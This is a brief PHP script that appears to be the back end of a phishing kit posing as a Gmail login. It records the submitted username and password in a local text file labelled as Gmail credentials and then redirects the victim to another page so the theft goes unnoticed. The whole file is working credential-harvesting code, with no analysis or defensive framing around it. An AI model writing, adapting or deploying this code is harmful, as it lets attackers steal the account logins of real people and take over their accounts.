<?php
file_put_contents("usernames.txt", "GMAIL CREDENTIALS:: [EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location:/index3.html');
exit();

